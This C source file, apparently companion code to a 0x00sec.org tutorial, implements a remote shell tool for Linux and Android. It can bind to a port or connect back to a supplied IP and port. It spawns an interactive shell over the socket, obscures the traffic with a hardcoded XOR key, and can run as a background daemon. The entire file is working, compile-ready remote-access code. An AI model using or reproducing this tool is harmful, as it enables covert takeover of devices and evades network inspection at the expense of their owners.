/*
  Remote Shells
  Copyright (c) 2016 picoFlamingo

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*************************************************************
  Read the post at 0x00sec.org
https://0x00sec.org/t/remote-shells-part-iii-shell-access-your-phone/508

**********************************************************************/
#include <stdio.h>
#include <stdlib.h>  
#include <string.h>

#include <unistd.h> 

#include <sys/socket.h>
#include <arpa/inet.h>

#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

/* Helper functions */
#define KEY_LEN 8
static unsigned char *p ="\x32\x56\x12\xF3\xD2\x5B\x0e\xdc\0";

void*
my_memfrob (void *d, size_t n)
{
  int            i;
  unsigned char *s = (unsigned char*) d;

  for (i = 0; i < n; i++) s[i] ^= p[i % KEY_LEN];
  return s;
}

/* Network code*/
int
server_init (int port)
{
  socklen_t          clen;
  struct sockaddr_in serv, client;
  int                s, s1;
  int                ops =1;

  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket:");
      exit (EXIT_FAILURE);
    }

  /* Gracefully deal with TIME_WAIT state */
  setsockopt (s, SOL_SOCKET, SO_REUSEADDR, &ops, sizeof(ops));

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);
  serv.sin_addr.s_addr = htonl(INADDR_ANY);
  
  if ((bind (s, (struct sockaddr *)&serv, 
	     sizeof(struct sockaddr_in))) < 0)
    {
      perror ("bind:");
      exit (EXIT_FAILURE);
    }

  if ((listen (s, 10)) < 0)
    {
      perror ("listen:");
      exit (EXIT_FAILURE);
    }
  clen = sizeof(struct sockaddr_in);
  if ((s1 = accept (s, (struct sockaddr *) &client, 
		    &clen)) < 0)
    {
      perror ("accept:");
      exit (EXIT_FAILURE);
    }

  return s1;

}

int
client_init (char *ip, int port)
{
  int                s;
  struct sockaddr_in serv;

#ifdef VERBOSE
  printf ("+ Connecting to %s:%d\n", ip, port);
#endif
  if ((s = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("socket:");
      exit (EXIT_FAILURE);
    }

  serv.sin_family = AF_INET;
  serv.sin_port = htons(port);
  serv.sin_addr.s_addr = inet_addr(ip);

  if (connect (s, (struct sockaddr *) &serv, sizeof(serv)) < 0) 
    {
      perror("connect:");
      exit (EXIT_FAILURE);
    }

  return s;
}


int
start_shell (int s)
{
  char *name[3] ;

#ifdef VERBOSE
  printf ("+ Starting shell\n");
#endif
  dup2 (s, 0);
  dup2 (s, 1);
  dup2 (s, 2);

#ifdef _ANDROID
  name[0] = "/system/bin/sh";
#else  
  name[0] = "/bin/sh";
#endif
  name[1] = "-i";
  name[2] = NULL;
  execv (name[0], name );
  exit (EXIT_FAILURE);

  return 0;
}


void
async_read (int s, int s1)
{
  fd_set         rfds;
  struct timeval tv;
  int            max = s > s1 ? s : s1;
  int            len, r;
  char           buffer[1024];

  max++;
  while (1)
    {
      FD_ZERO(&rfds);
      FD_SET(s,&rfds);
      FD_SET(s1,&rfds);

      /* Time out. */
      tv.tv_sec = 1;
      tv.tv_usec = 0;

      if ((r = select (max, &rfds, NULL, NULL, &tv)) < 0)
	{
	  perror ("select:");
	  exit (EXIT_FAILURE);
	}
      else if (r > 0) /* If there is data to process */
	{
	  if (FD_ISSET(s, &rfds))
	    {
	      memset (buffer, 0, 1024);
	      if ((len = read (s, buffer, 1024)) <= 0) 	exit (EXIT_FAILURE);
	      my_memfrob (buffer, len);

	      write (s1, buffer, len);
	    }
	  if (FD_ISSET(s1, &rfds))
	    {
	      memset (buffer, 0, 1024);
	      if ((len = read (s1, buffer, 1024)) <= 0) exit (EXIT_FAILURE);

	      my_memfrob (buffer, len);
	      write (s, buffer, len);
	    }
	}
    }
}

void
secure_shell (int s)
{
  pid_t  pid;
  int    sp[2];

  /* Create a socketpair to talk to the child process */
  if ((socketpair (AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
    {
      perror ("socketpair:");
      exit (1);
    }

  /* Fork a shell */
  if ((pid = fork ()) < 0)
    {
      perror ("fork:");
      exit (1);
    }
  else
    if (!pid) /* Child Process */
      {
	close (sp[1]);
	close (s);

	start_shell (sp[0]);
	/* This function will never return */
      }

  /* At this point we are the father process */
  close (sp[0]);
#ifdef VERBOSE
  printf ("+ Starting async read loop\n");
#endif
  async_read (s, sp[1]);

}




int
main (int argc, char *argv[])
{
  int  i =1;
  /* FIXME: Check command-line arguments */
  /* Go daemon ()*/

  if (argv[i][0] == 'd') 
    {
      i++;
      daemon (0,0);
    }
  if (argv[i][0] == 'c')
    secure_shell (client_init (argv[i+1], atoi(argv[i+2])));
  else if (argv[i][0] == 'a')
    async_read (client_init (argv[i+1], atoi(argv[i+2])), 0);
  if (argv[i][0] == 's')
    secure_shell (server_init (atoi(argv[i+1])));
  else if (argv[i][0] == 'b')
    async_read (server_init (atoi(argv[i+1])), 0);
  
  
  return 0;
}
